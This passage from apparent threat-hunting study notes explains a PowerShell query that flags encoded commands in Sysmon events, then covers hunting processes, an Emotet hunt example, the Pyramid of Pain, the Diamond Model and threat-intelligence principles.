           ParentUser: DESKTOP-NU10MTO\Administrator
--- SNIP ---
```

- | Where-Object {$_.Properties[21].Value -like "*-enc*"}: This portion of the command further filters the retrieved events. The '|' character (pipe operator) passes the output of the previous command (i.e., the filtered events) to the 'Where-Object' cmdlet. The 'Where-Object' cmdlet filters the output based on the script block that follows it.
- $_: In the script block, $_ refers to the current object in the pipeline, i.e., each individual event that was retrieved and passed from the previous command.
- .Properties[21].Value: The Properties property of a "Process Create" Sysmon event is an array containing various data about the event. The specific index 21 corresponds to the ParentCommandLine property of the event, which holds the exact command line used to start the process.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/58d4b44a-dfc2-404e-b654-3e13d530df17)

- -like "*-enc*": This is a comparison operator that matches strings based on a wildcard string, where * represents any sequence of characters. In this case, it's looking for any command lines that contain -enc anywhere within them. The -enc string might be part of suspicious commands, for example, it's a common parameter in PowerShell commands to denote an encoded command which could be used to obfuscate malicious scripts.
- | Format-List: Finally, the output of the previous command (the events that meet the specified condition) is passed to the Format-List cmdlet. This cmdlet displays the properties of the input objects as a list, making it easier to read and analyze.

# Threat Hunting Fundamentals
### Threat Hunting Definition


The median duration between an actual security breach and its detection, otherwise termed "dwell time", is usually several weeks, if not months. This implies a potential adversarial presence within a network for a span approaching three weeks, a duration that can be significantly impactful.

This alarming fact underscores the growing inefficacy of traditional, defense-oriented cybersecurity tactics. In response, we advocate for a paradigm shift towards a proactive, offensive strategy – the initiation of threat hunting.

Threat hunting is an active, human-led, and often hypothesis-driven practice that systematically combs through network data to identify stealthy, advanced threats that evade existing security solutions. This strategic evolution from a conventionally reactive posture allows us to uncover insidious threats that automated detection systems or external entities such as law enforcement might not discern.

The principal objective of threat hunting is to substantially reduce dwell time by recognizing malicious entities at the earliest stage of the cyber kill chain. This proactive stance has the potential to prevent threat actors from entrenching themselves deeply within our infrastructure and to swiftly neutralize them.

The threat hunting process commences with the identification of assets – systems or data – that could be high-value targets for threat actors. Next, we analyze the TTPs (Tactics, Techniques, and Procedures) these adversaries are likely to employ, based on current threat intelligence. We subsequently strive to proactively detect, isolate, and validate any artifacts related to the abovementioned TTPs and any anomalous activity that deviates from established baseline norms.

During the hunting endeavor, we regularly employ Threat Intelligence, a vital component that aids in formulating effective hunting hypotheses, developing counter-tactics, and executing protective measures to prevent system compromise.

### Key facets of threat hunting include:

- An offensive, proactive strategy that prioritizes threat anticipation over reaction, based on hypotheses, attacker TTPs, and intelligence.
- An offensive, reactive response that searches across the network for artifacts related to a verified incident, based on evidence and intelligence.
- A solid, practical comprehension of threat landscape, cyber threats, adversarial TTPs, and the cyber kill chain.
- Cognitive empathy with the attacker, fostering an understanding of the adversarial mindset.
- A profound knowledge of the organization's IT environment, network topology, digital assets, and normal activity.
- Utilization of high-fidelity data and tactical analytics, and leveraging advanced threat hunting tools and platforms.

## The Relationship Between Incident Handling & Threat Hunting

So, how does threat hunting intersect with the various phases of Incident Handling?

- In the Preparation phase of incident handling, a threat hunting team must set up robust, clear rules of engagement. Operational protocols must be established, outlining when and how to intervene, the course of action in specific scenarios, and so forth. Organizations may choose to weave threat hunting into their existing incident handling policies and procedures, obviating the need for separate threat hunting policies and procedures.

- During the Detection & Analysis phase of incident handling, a threat hunter’s acumen is indispensable. They can augment investigations, ascertain whether the observed indicators of compromise (IoCs) truly signify an incident, and further, their adversarial mindset can help uncover additional artifacts or IoCs that might have been missed initially.

- In the Containment, Eradication, and Recovery phase of incident handling, the role of a hunter can be diverse. Some organizations might expect hunters to perform tasks within the Containment, Eradication, and Recovery stages. However, this is not a universally accepted practice. The specific roles and responsibilities of the hunting team will be stipulated in the procedural documents and security policies.

- Regarding the Post-Incident Activity phase of incident handling, hunters, with their extensive expertise spanning various IT domains and IT Security, can contribute significantly. They can proffer recommendations to fortify the organization's overall security posture.

We tried to shed light on the symbiotic relationship between incident handling and threat hunting. Whether these processes should be integrated or function independently is a strategic decision, contingent upon each organization's unique threat landscape, risk, etc.

### A Threat Hunting Team's Structure
The construction of a threat hunting team is a strategic and meticulously planned process that requires a diverse range of skills, expertise, and perspectives. It is crucial that each member of the team offers a unique set of competencies that, when combined, provide a holistic and comprehensive approach to identifying, mitigating, and eliminating threats.

**The ideal threat hunting team composition typically includes the following roles:**

- Threat Hunter: The core role within the team, threat hunters are cybersecurity professionals with a deep understanding of the threat landscape, cyber adversaries' Tactics, Techniques, and Procedures (TTPs), and sophisticated threat detection methodologies. They proactively search for Indicators of Compromise (IoCs) and are proficient in using a variety of threat hunting tools and platforms.

- Threat Intelligence Analyst: These individuals are responsible for gathering and analyzing data from a variety of sources, including open-source intelligence, dark web intelligence, industry reports, and threat feeds. Their job is to understand the current threat landscape and predict future trends, providing valuable insights to threat hunters.

- Incident Responders: When threat hunters identify potential threats, incident responders step in to manage the situation. They investigate the incident thoroughly and they are also responsible for containment, eradication, and recovery actions, and they ensure that the organization can quickly resume normal operations.

- Forensics Experts: These are the team members who delve deep into the technical details of an incident. They are proficient in digital forensics and incident response (DFIR), capable of analyzing malware, reverse engineering attacks, and providing detailed incident reports.

- Data Analysts/Scientists: They play a pivotal role in examining large datasets, using statistical models, machine learning algorithms, and data mining techniques to uncover patterns, correlations, and trends that can lead to actionable insights for threat hunters.

- Security Engineers/Architects: Security engineers are responsible for the overall design of the organization's security infrastructure. They ensure that all systems, applications, and networks are designed with security in mind, and they often work closely with threat hunters to implement tools and techniques that facilitate threat hunting, as well as kill-chain defenses.

- Network Security Analyst: These professionals specialize in network behavior and traffic patterns. They understand the normal ebb and flow of network activity and can quickly identify anomalies indicative of a potential security breach.

- SOC Manager: The Security Operations Center (SOC) manager oversees the operations of the threat hunting team, ensuring smooth coordination among team members and effective communication with the rest of the organization.

> [!IMPORTANT]
When Should We Hunt?

In the realm of cybersecurity, threat hunting should not be seen as a sporadic or reactionary practice, but rather as a sustained, forward-thinking activity. Nevertheless, there are specific instances that call for an immediate and intense threat hunting operation. Here's a more intricate breakdown of these instances:

- When New Information on an Adversary or Vulnerability Comes to Light: The cybersecurity landscape is always evolving, with fresh intel on potential threats and system vulnerabilities being uncovered regularly. If there's a newly discovered adversary or a vulnerability associated with an application that our network utilizes, this calls for an immediate threat hunting session. It's imperative to decipher the adversary's modus operandi and scrutinize the vulnerability to evaluate the possible risk to our systems. For instance, if we stumble upon a previously unknown vulnerability in a widely utilized application, we'd promptly kickstart a threat hunting initiative to seek out any signs of exploitation.

- When New Indicators are Associated with a Known Adversary: Often, cybersecurity intelligence sources release new Indicators of Compromise (IoCs) tied to specific adversaries. If these indicators are associated with an adversary known for targeting networks akin to ours or if we've been a past target of the same adversary, we need to launch a threat hunting initiative. This aids in detecting any traces of the adversary's activities within our system, allowing us to ward off potential breaches.

- When Multiple Network Anomalies are Detected: Network anomalies might sometimes be harmless, caused by system glitches or valid alterations. However, several anomalies appearing concurrently or within a short period might hint at a systemic issue or an orchestrated attack. In such cases, it's crucial to carry out threat hunting to pinpoint the root cause of these anomalies and address any possible threats. For instance, if we observe odd network traffic behavior or unexpected system activities, we'd initiate threat hunting to probe these anomalies.

- During an Incident Response Activity: Upon the detection of a confirmed security incident, our Incident Response (IR) team will concentrate on containment, eradication, and recovery. Yet, while the IR process is in motion, it's vital to simultaneously conduct threat hunting across the network. This enables us to expose any connected threats that might not be readily visible, understand the full extent of the compromise, and avert further harm. For example, during a confirmed malware infiltration, while the IR team is dealing with the infected system, threat hunting can assist in identifying other potentially compromised systems.

- Periodic Proactive Actions: Beyond the scenarios mentioned above, it's crucial to note that threat hunting should not be simply a reactive task. Regular, proactive threat hunting exercises are key to discovering latent threats that may have slipped past our security defenses. This guarantees a continual monitoring strategy, bolstering our overall security stance and minimizing the prospective impact of an attack.

In a nutshell, the ideal time for threat hunting is always the present. A proactive stance on threat hunting lets us detect and neutralize threats before they can inflict substantial damage.

### The Relationship Between Risk Assessment & Threat Hunting

- Risk assessment, as an essential facet of cybersecurity, enables a comprehensive understanding of the potential vulnerabilities and threat vectors within an organization. In the context of threat hunting, risk assessment serves as a key enabler, allowing us to prioritize our hunting activities and focus our efforts on the areas of greatest potential impact.

To begin with, risk assessment entails a systematic process of identifying and evaluating risks based on potential threat sources, existing vulnerabilities, and the potential impact should these vulnerabilities be exploited. It involves a series of steps including asset identification, threat identification, vulnerability identification, risk determination, and finally, risk mitigation strategy formulation.

**In the threat hunting process, the information gleaned from a thorough risk assessment can guide our activities in several ways:**


- Prioritizing Hunting Efforts: By recognizing the most critical assets (often referred to as 'crown jewels') and their associated risks, we can prioritize our threat hunting efforts on these areas. Assets could include sensitive data repositories, mission-critical applications, or key network infrastructure.

- Understanding Threat Landscape: The threat identification step of the risk assessment allows us to understand the threat landscape better, including the Tactics, Techniques, and Procedures (TTPs) used by potential threat actors. This understanding assists us in developing our hunting hypotheses, which are essential for proactive threat hunting.

- Highlighting Vulnerabilities: Risk assessment helps to highlight vulnerabilities in our systems, applications, and processes. Knowing these weaknesses enables us to look for exploitation indicators in these areas. For instance, if we know a particular application has a vulnerability that allows for privilege escalation, we can look for anomalies in user privilege levels.

- Informing the Use of Threat Intelligence: Threat intelligence is often used in threat hunting to identify patterns of malicious behavior. Risk assessment helps inform the application of threat intelligence by identifying the most likely threat actors and their preferred methods of attack.

- Refining Incident Response Plans: Risk assessment also plays a critical role in refining Incident Response (IR) plans. Understanding the likely risks helps us anticipate and plan for potential breaches, ensuring a swift and effective response.

- Enhancing Cybersecurity Controls: Lastly, the risk mitigation strategies derived from risk assessment can directly feed into enhancing existing cybersecurity controls and defenses, further strengthening the organization’s security posture.

The technicalities of employing risk assessment for threat hunting include the use of advanced tools and techniques. These range from automated vulnerability scanners and penetration testing tools to sophisticated threat intelligence platforms. For instance, SIEM (Security Information and Event Management) systems can be used to aggregate and correlate events from various sources, providing a holistic view of the organization's security status and aiding in threat hunting.

In essence, risk assessment and threat hunting are deeply intertwined, each augmenting the other to create a more robust and resilient cybersecurity posture. By regularly conducting comprehensive risk assessments, we can better focus our threat hunting activities, thereby reducing dwell time, mitigating potential damage, and enhancing our overall cybersecurity defense.

### The Threat Hunting Process
Below is a brief description of the threat hunting process:

- Setting the Stage: The initial phase is all about planning and preparation. It includes laying out clear targets based on a deep understanding of the threat landscape, our business's critical requirements, and our threat intelligence insights. The preparation phase also encompasses making certain our environment is ready for effective threat hunting, which might involve enabling extensive logging across our systems and ensuring threat hunting tools, such as SIEM, EDR, IDS, are correctly set up. Additionally, we stay informed about the most recent cyber threats and familiarize ourselves with threat actor profiles.

- Example: During the planning and preparation phase, a threat hunting team might conduct in-depth research on the latest threat intelligence reports, analyze industry-specific vulnerabilities, and study the tactics, techniques, and procedures (TTPs) employed by threat actors. They may also identify critical assets and systems within the organization that are most likely to be targeted. As part of the preparation, extensive logging mechanisms can be implemented across servers, network devices, and endpoints to capture relevant data for analysis. Threat hunting tools like SIEM, EDR, and IDS are configured to collect and correlate logs, generate alerts, and provide visibility into potential security incidents. Additionally, the team stays updated on emerging cyber threats by monitoring threat feeds, subscribing to relevant security mailing lists, and participating in information sharing communities.

- Formulating Hypotheses: The next step involves making educated predictions that will guide our threat hunting journey. These hypotheses can stem from various sources, like recent threat intelligence, industry updates, alerts from security tools, or even our professional intuition. We strive to make these hypotheses testable to guide us where to search and what to look for.

- Example: A hypothesis might be that an attacker has gained access to the network by exploiting a particular vulnerability or through phishing emails. This hypothesis could be derived from recent threat intelligence reports that highlight similar attack vectors. It could also be based on an alert triggered by an intrusion detection system indicating suspicious network traffic patterns. The hypothesis should be specific and testable, such as "An advanced persistent threat (APT) group is leveraging a known vulnerability in the organization's web server to establish a command-and-control (C2) channel."

- Designing the Hunt: Upon crafting a hypothesis, we need to develop a hunting strategy. This includes recognizing the specific data sources that need analysis, the methodologies and tools we'll use, and the particular indicators of compromise (IoCs) or patterns we'll hunt for. At this point, we might also create custom scripts or queries and utilize dedicated threat hunting tools.

- Example: The threat hunting team may decide to analyze web server logs, network traffic logs, DNS logs, or endpoint telemetry data. They define the search queries, filters, and correlation rules to extract relevant information from the collected data. The team also leverages threat intelligence feeds and open-source intelligence (OSINT) to identify specific indicators of compromise (IoCs) associated with the suspected threat actor or known attack techniques. This may involve crafting custom scripts or queries to search for IoCs or using specialized threat hunting platforms that automate the process.

- Data Gathering and Examination: This phase is where the active threat hunt occurs. It involves collecting necessary data, such as log files, network traffic data, endpoint data, and then analyzing this data using the predetermined methodologies and tools. Our goal is to find evidence that either supports or refutes our initial hypothesis. This phase is highly iterative, possibly involving refinement of the hypothesis or the investigation approach as we uncover new information.

- Example: The threat hunting team might examine web server access logs to identify unusual or unauthorized access patterns, analyze network traffic captures to detect suspicious communications with external domains, or investigate endpoint logs to identify anomalous behavior or signs of compromise. They apply data analysis techniques such as statistical analysis, behavioral analysis, or signature-based detection to identify potential threats. They might employ tools like log analyzers, packet analyzers, or malware sandboxes to extract information from the collected data and uncover hidden indicators of compromise.

- Evaluating Findings and Testing Hypotheses: After analyzing the data, we need to interpret the results. This could involve confirming or disproving the hypothesis, understanding the behavior of any detected threats, identifying affected systems, or determining the potential impact of the threat. This phase is crucial, as it will inform the next steps in terms of response and remediation.

- Example: The threat hunting team might discover a series of failed login attempts from an IP address associated with a known threat actor, confirming the hypothesis of an attempted credential brute-force attack. They might also find evidence of suspicious outbound network connections to known malicious domains, supporting the hypothesis of a command-and-control (C2) communication channel. The team conducts deeper investigations to understand the behavior of the identified threats, assess the scope of the compromise, and determine the potential impact on the organization's systems and data.

- Mitigating Threats: If we confirm a threat, we must undertake remediation actions. This could involve isolating affected systems, eliminating malware, patching vulnerabilities, or modifying configurations. Our goal is to eradicate the threat and limit any potential damage.
- Example: If the threat hunting team identifies a compromised system communicating with a C2 server, they may isolate the affected system from the network to prevent further data exfiltration or damage. They may deploy endpoint protection tools to remove malware or perform forensic analysis on the compromised system to gather additional evidence and determine the extent of the breach. Vulnerabilities identified during the threat hunting process can be patched or mitigated to prevent future attacks. Network configurations can be adjusted to restrict unauthorized access or to strengthen security controls.

- After the Hunt: Once the threat hunting cycle concludes, it's crucial to document and share the findings, methods, and outcomes. This might involve updating threat intelligence platforms, enhancing detection rules, refining incident response playbooks, or improving security policies. It's also vital to learn from each threat hunting mission to enhance future efforts.
- Example: Once the threat hunting cycle concludes, the team documents the findings, methodologies, and outcomes of the investigation. They update threat intelligence platforms with newly discovered indicators of compromise (IoCs) and share relevant information with other teams or external partners to enhance the collective defense against threats. They may improve detection rules within security tools based on the observed attack patterns and refine incident response playbooks to streamline future incident handling. Lessons learned from the hunt are incorporated into security policies and procedures, and training programs are adjusted to enhance the organization's overall security posture.

- Continuous Learning and Enhancement: Threat hunting is not a one-time task, but a continuous process of learning and refinement. Each threat hunting cycle should feed into the next, allowing for continuous improvement of hypotheses, methodologies, and tools based on the evolving threat landscape and the organization's changing risk profile.

- Example: After each threat hunting cycle, the team reviews the effectiveness of their hypotheses, methodologies, and tools. They analyze the results and adjust their approach based on lessons learned and new threat intelligence. For example, they might enhance their hunting techniques by incorporating machine learning algorithms or behavioral analytics to detect more sophisticated threats. They participate in industry conferences, attend training sessions, and collaborate with other threat hunting teams to stay updated on the latest attack techniques and defensive strategies.

**Threat hunting is a delicate balance of art and science. It demands technical prowess, creativity, and a profound understanding of both the organization's environment and the broader threat landscape. The most successful threat hunting teams are those that learn from each hunt and constantly hone their skills and processes.**


### The Threat Hunting Process VS Emotet


Let's see how the abovementioned threat hunting process could have been applied to hunt for emotet malware within an organization.

- Setting the Stage: During the planning and preparation phase, the threat hunting team extensively researches the Emotet malware's tactics, techniques, and procedures (TTPs) by studying previous attack campaigns, analyzing malware samples, and reviewing threat intelligence reports specific to Emotet. They gain a deep understanding of Emotet's infection vectors, such as malicious email attachments or links, and the exploitation of vulnerabilities in software or operating systems. The team identifies critical assets and systems that are commonly targeted by Emotet, such as endpoints with administrative privileges or email servers.

- Formulating Hypotheses: Hypotheses in the context of Emotet threat hunting might be based on known Emotet IoCs or patterns observed in previous attacks. For example, a hypothesis could be that Emotet is using a new phishing technique to distribute malicious payloads via compromised email accounts. This hypothesis could be derived from recent threat intelligence reports highlighting similar Emotet campaigns or based on alerts triggered by email security systems detecting suspicious email attachments. The hypothesis should be specific, such as "Emotet is using compromised email accounts to send phishing emails with malicious Word documents containing macros."

- Designing the Hunt: In the design phase, the threat hunting team determines the relevant data sources and collection methods to validate or invalidate the Emotet-related hypotheses. They may decide to analyze email server logs, network traffic logs, endpoint logs, or sandboxed malware samples. They define search queries, filters, and correlation rules to extract information related to Emotet's specific characteristics, such as email subject lines, attachment types, or network communication patterns associated with Emotet infections. They leverage threat intelligence feeds to identify Emotet-related IoCs, such as known command-and-control (C2) server addresses or file hashes associated with Emotet payloads.

- Data Gathering and Examination: During the active threat hunting phase, the team collects and analyzes data from various sources to detect Emotet-related activities. For example, they might examine email server logs to identify patterns of suspicious email attachments or analyze network traffic captures to detect communication with known Emotet C2 servers. They apply data analysis techniques, such as email header analysis, network traffic pattern analysis, or behavioral analysis, to identify potential Emotet infections. They utilize tools like email forensics software, network packet analyzers, or sandbox environments to extract relevant information from the collected data and uncover hidden indicators of Emotet activity.

-  Evaluating Findings and Testing Hypotheses: In this phase, the team evaluates the findings from data analysis to confirm or refute the initial Emotet-related hypotheses. For example, they might discover a series of emails with similar subject lines and attachment types associated with Emotet campaigns, confirming the hypothesis of ongoing Emotet phishing activities. They might also find evidence of network connections to known Emotet C2 servers, supporting the hypothesis of an active Emotet infection. The team conducts deeper investigations to understand the behavior of the identified Emotet infections, assess the scope of the compromise, and determine the potential impact on the organization's systems and data.

-  Mitigating Threats: If Emotet infections are confirmed, the team takes immediate remediation actions. They isolate affected systems from the network to prevent further spread of the malware and potential data exfiltration. They deploy endpoint protection tools to detect and remove Emotet malware from compromised systems. Additionally, they analyze compromised email accounts to identify and remove unauthorized access. They patch or mitigate vulnerabilities exploited by Emotet to prevent future infections. Network configurations are adjusted to block communication with known Emotet C2 servers or malicious domains.

-  After the Hunt: Once the Emotet threat hunting cycle concludes, the team documents their findings, methodologies, and outcomes. They update threat intelligence platforms with new Emotet-related IoCs and share relevant information with other teams or external partners to enhance their collective defense against Emotet. They improve detection rules within security tools based on the observed Emotet attack patterns and refine incident response playbooks to streamline future incident handling. Lessons learned from the Emotet hunt are incorporated into security policies and procedures, and training programs are adjusted to enhance the organization's overall defenses against Emotet and similar malware.

-  Continuous Learning and Enhancement: Threat hunting for Emotet is an ongoing process that requires continuous learning and improvement. After each Emotet threat hunting cycle, the team reviews the effectiveness of their hypotheses, methodologies, and tools. They analyze the results and adjust their approach based on lessons learned and new Emotet-related threat intelligence. For example, they might enhance their hunting techniques by incorporating advanced behavior-based detection mechanisms or machine learning algorithms specifically designed to identify Emotet's evolving TTPs. They actively participate in industry conferences, attend training sessions, and collaborate with other threat hunting teams to stay updated on the latest Emotet attack techniques and defensive strategies.


### Threat Hunting Glossary

Within the domain of cybersecurity and threat hunting, several crucial terms and concepts play a pivotal role. Here's an enriched understanding of these:

- Adversary: An adversary, within the realm of Cyber Threat Intelligence (CTI), refers to an entity driven by shared objectives as your organization, albeit unauthorized, seeking to infiltrate your business and satisfy their collection requirements, which may include financial gains, insider information, or valuable intellectual property. These adversaries possess varying levels of technical expertise and are motivated to circumvent your security measures.

Adversaries can be classified into distinct categories, including cyber criminals, insider threats, hacktivists, or state-sponsored operators. Each category exhibits unique characteristics and motivations in their pursuit of unauthorized access and exploitation.

- Advanced Persistent Threat (APT): APTs are typically associated with highly organized groups or nation-state entities that possess extensive resources, thereby enabling them to carry out their malicious activities over prolonged periods. While APTs target various sectors, they show a marked preference for high-value targets, which can include governmental organizations, healthcare infrastructures, and defense systems.

Contrary to what the name might suggest, being labeled as an APT doesn't necessarily imply that the group utilizes technologically advanced techniques. Rather, the 'Advanced' aspect can refer to the sophisticated strategic planning, and 'Persistent' alludes to their dogged persistence in achieving their objectives, backed by substantial resources including, but not limited to, financial backing, manpower, and time.

- Tactics, Techniques, and Procedures (TTPs): A term borrowed from the military, TTPs symbolize the distinct operational patterns or 'signature' of an adversary.

```
- Tactics: This term describes the strategic objectives and high-level concepts of operations employed by the adversary. Essentially, it addresses the 'why' behind their actions.
- Techniques: These are the specific methods utilized by an adversary to accomplish their tactical objectives, providing the 'how' behind their actions. Techniques don't provide step-by-step instructions but rather describe the general approach to achieving a goal.
- Procedures: These are the granular, step-by-step instructions, essentially the 'recipe' for the implementation of each technique.
```
Analyzing TTPs offers deep insights into how an adversary penetrates a network, moves laterally within it, and achieves their objectives. Understanding TTPs allows for the creation of Indicators of Compromise (IOCs), which can help detect and thwart future attacks.

- Indicator: An indicator, when analyzed in CTI, encompasses both technical data and contextual information. Isolated technical data lacking relevant context holds limited or negligible value for network defenders. Contextual details allow for a comprehensive understanding of the indicator's significance, enabling effective threat analysis and response.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/11c77bd4-13fb-4582-87ca-c7bf8293259d)

- Threat: A threat is a multifaceted concept, consisting of three fundamental factors, intent, capability, and opportunity

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/110f769a-1182-4218-b6b5-0b5ff80ee8e9)

Firstly, intent signifies the underlying rationale driving adversaries to target and exploit your network infrastructure. This intent can range from corporate espionage to financial gains through cybercrime, or even targeting your business relationships with other entities.

Secondly, capability denotes the tools, resources, and financial backing that adversaries possess to carry out their operations successfully. Their skill level in penetrating your network and the availability of sufficient financial resources determine their capability to sustain ongoing attacks against your organization.

Lastly, opportunity refers to conditions or events that provide favorable circumstances for adversaries to execute their operations. This encompasses instances where adversaries acquire relevant email addresses or credentials from your network, as well as their awareness of vulnerabilities in specific software systems.

- Campaign: A campaign refers to a collection of incidents that share similar Tactics, Techniques, and Procedures (TTPs) and are believed to have comparable collection requirements. This type of intelligence necessitates substantial time and effort to aggregate and analyze, as businesses and organizations progressively report and uncover related malicious activities.

- Indicators of Compromise (IOCs): IOCs are digital traces or artifacts derived from active or past intrusions. They serve as 'signposts' of a specific adversary or malicious activity. IOCs can include a wide array of elements such as the hashes of malicious files, suspicious IP addresses, URLs, domain names, and names of malicious executables or scripts. Continually tracking, cataloging, and analyzing IOCs can greatly enhance our threat detection capabilities, leading to faster and more effective responses to cyber threats.

- Pyramid of Pain: Pyramid of Pain is a critical visualization which presents a hierarchy of indicators that can support us in detecting adversaries. It also showcases the degree of difficulty in acquiring these specific indicators and the subsequent impact of gathering intelligence on them. The Pyramid of Pain concept was brought to life by David Bianco from FireEye in his insightful presentation, Intel-Driven Detection and Response to Increase Your Adversary’s Cost of Operations. As we ascend the Pyramid of Pain, obtaining adversary-specific Indicators of Compromise (IOCs) becomes increasingly challenging. However, the flip side is that acquiring these specific IOCs forces the adversary to alter their attack methodologies, a task that is far from simple for them.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/3ff44e11-e483-4be7-bb18-387ee4b86166)


- Hash Values: Hash values are the digital fingerprints of files. They are created using algorithms like MD5, SHA-1, or SHA-256 that take an input (or 'message') and return a fixed-size string of bytes. For instance, malware binaries can be identified through their unique hash values. However, a slight change to the file, such as adding a byte or changing a single character, will dramatically alter the hash value, making it an easy-to-change and, therefore, less reliable indicator.

- IP Addresses: IP addresses are unique identifiers for devices on a network. They can be used to track the source of network traffic or a potential attack. However, adversaries often use tactics such as IP spoofing, VPNs, proxies, or TOR networks to hide their true IP addresses, making this level of indicator easy to change and somewhat unreliable.

- Domain Names: Domains are used to identify one or more IP addresses. For example, the domain name www.example.com represents about a dozen IP addresses. Malicious actors often use domain generation algorithms (DGAs) to produce a large number of pseudo-random domain names to evade detection. They can also use dynamic DNS services to quickly change the IP addresses associated with a domain.

### Network/Host Artifacts:

- Network Artifacts: These are residual traces of an attacker's activities within the network infrastructure. They can be found in network logs, packet captures, netflow data, or DNS request logs, to name a few. Examples might include certain patterns in network traffic, unique packet headers, or unusual protocol usage. Network artifacts are challenging for an attacker to modify without impacting the effectiveness or stealth of their operation.

- Host Artifacts: On the other hand, host artifacts refer to remnants of malicious activity left on individual systems or endpoints. These could be found within system logs, file systems, registry keys, list of running processes, loaded DLLs, or even in volatile memory. For instance, unusual entries in the Windows Registry, unique file paths, or suspicious running processes could all be considered host artifacts. These indicators are also fairly hard for an adversary to alter without affecting their intrusion campaign or revealing their presence.

- Analyzing these artifacts can provide valuable insights into an adversary's tools, techniques, and procedures (TTPs), and help in the detection and prevention of future attacks. However, the higher position of Network and Host Artifacts in the Pyramid of Pain indicates that they are harder to utilize for detection, and also harder for the attacker to change or obfuscate.

- Tools: Tools refer to the software used by adversaries to conduct their attacks. This could include malware, exploits, scripts, or command and control (C2) frameworks. Identifying the tools used by an adversary can provide valuable insight into their capabilities and intentions. However, sophisticated adversaries often use custom tools or modify existing ones to evade detection.

- TTPs (Tactics, Techniques, and Procedures):  This is the pinnacle of the Pyramid of Pain. TTPs refer to the specific methods used by adversaries to conduct their attacks. Tactics describe the adversary's overall objectives, techniques describe the actions taken to achieve those objectives, and procedures are the exact steps taken to execute the techniques. Identifying an adversary's TTPs can provide the most valuable insight into their operations and are the most difficult for an adversary to change without significant cost and effort. Examples might include the use of spear-phishing emails for initial access (tactic), exploitation of a specific software vulnerability (technique), and the specific steps taken to exploit that vulnerability (procedure).

- Diamond Model: The Diamond Model of Intrusion Analysis is a conceptual framework designed to illustrate the fundamental aspects of a cyber intrusion. This model, developed by Sergio Caltagirone, Andrew Pendergast, and Christopher Betz, aims to provide a more structured approach to understand, analyze, and respond to cyber threats.

The model is structured around four key components, represented as vertices of a diamond:

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/f6cd57ea-875b-486c-a1d1-71d3453df460)


- Adversary: This represents the individual, group, or organization responsible for the cyber intrusion. It's important to understand their capabilities, motivations, and intent to effectively defend against their attacks.

- Capability: This represents the tools, techniques, and procedures (TTPs) that the adversary uses to carry out the intrusion. This could include malware, exploits, and other malicious tools, as well as the specific methods used to deploy these tools.

- Infrastructure: This represents the physical and virtual resources that the adversary uses to facilitate the intrusion. It can include servers, domain names, IP addresses, and other network resources used to deliver malware, control compromised systems, or exfiltrate data.

- Victim: This represents the target of the intrusion, which could be an individual, organization, or system. Understanding the victim's vulnerabilities, the value of their assets, and their potential exposure to threats is crucial for effective defense.


These four components are connected by bidirectional arrows, representing the dynamic relationships and interactions between them. For example, an adversary uses capabilities through an infrastructure to target a victim. This model allows for the capture of complex relationships and the construction of robust strategies for threat detection, mitigation, and prediction.

Comparing this to the Cyber Kill Chain model, we can see that the Diamond Model provides a more detailed view of the cyber intrusion ecosystem. While the Cyber Kill Chain focuses more on the stages of an attack (from reconnaissance to actions on objectives), the Diamond Model provides a more holistic view of the components involved in the intrusion and their interrelationships.

Let's consider a technical example to illustrate the Diamond Model: Suppose a financial institution (Victim) is targeted by a cybercriminal group (Adversary). The group uses spear-phishing emails (Capability) sent from a botnet (Infrastructure) to deliver a banking Trojan. When a recipient clicks on a malicious link in the email, the Trojan is installed on their system, allowing the cybercriminals to steal sensitive financial data.

In this scenario, the Diamond Model helps to highlight the interplay between the different components of the intrusion. By analyzing these components and their interactions, the financial institution can gain a deeper understanding of the threat they're facing and develop more effective strategies for mitigating this and future threats. This could involve strengthening their email security protocols, monitoring for signs of the specific banking Trojan, or implementing measures to detect and respond to unusual network activity associated with the botnet.

Overall, the Diamond Model provides a complementary perspective to the Cyber Kill Chain, offering a different lens through which to understand and respond to cyber threats. Both models can be useful tools in the arsenal of a cybersecurity professional.

### Threat Intelligence Fundamentals

**Cyber Threat Intelligence Definition** 
Cyber Threat Intelligence (CTI) represents a vital asset in our arsenal, providing essential insights to fortify our defenses against cyberattacks. The primary objective of our CTI team is to transition our defense strategies from merely reactive measures to a more proactive, anticipatory stance. They contribute crucial insights to our Security Operations Center (SOC).

Four fundamental principles make CTI an integral part of our cybersecurity strategy:

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/4449cbda-16e3-4b40-ba6a-ccc059d12182)


- Relevance: The cyber world is awash with diverse sources of information, from social media posts and security vendor reports to shared insights from similar organizations. However, the true value of this information lies in its relevance to our organization. For instance, if there is a reported vulnerability in a software that we, or our trusted partner organizations, do not use, the urgency to implement defensive measures is naturally diminished.
- Timeliness: Swift communication of intelligence to our defense team is crucial for the implementation of effective mitigation measures. The value of information depreciates over time - freshly discovered data is more valuable, and 'aged' indicators lose their relevance as they might no longer be used by the adversary or may have been resolved by the affected organization.
- Actionability: Data under analysis by a CTI analyst should yield actionable insights for our defense team. If the intelligence doesn't offer clear directives for action, its value diminishes. Intelligence must be scrutinized until it yields relevant, timely, and actionable insights for our network defense. Unactionable intelligence can lead to a self-perpetuating cycle of non-productive analysis, often referred to as a "self-licking ice cream cone".
- Accuracy: Before disseminating any intelligence, it must be verified for accuracy. Incorrect indicators, misattributions, or flawed Tactics, Techniques, and Procedures (TTPs) can result in wastage of valuable time and resources. If the accuracy of any information is uncertain, it should be labeled with a confidence indicator, ensuring that our defense team is aware of potential inaccuracies.

**When these four factors synergize, the intelligence gleaned allows us to:**

- Gain insights into potential adversary operations and campaigns that might be targeting our organization.
- Enrich our data pool through analysis by CTI analysts and other network defenders.
- Uncover adversary TTPs, enabling the development of effective mitigation measures and enhancing our understanding of adversary behavior.
- Provide decision-makers within our organization with pertinent information for informed, impactful decision-making related to business operations.

**The Difference Between Threat Intelligence & Threat Hunting**

Threat Intelligence and Threat Hunting represent two distinct, yet intrinsically interconnected, specialties within the realm of cybersecurity. While they serve separate functions, they both contribute significantly to the development of a comprehensive security analyst. However, it's important to note that they are not substitutes for each other.

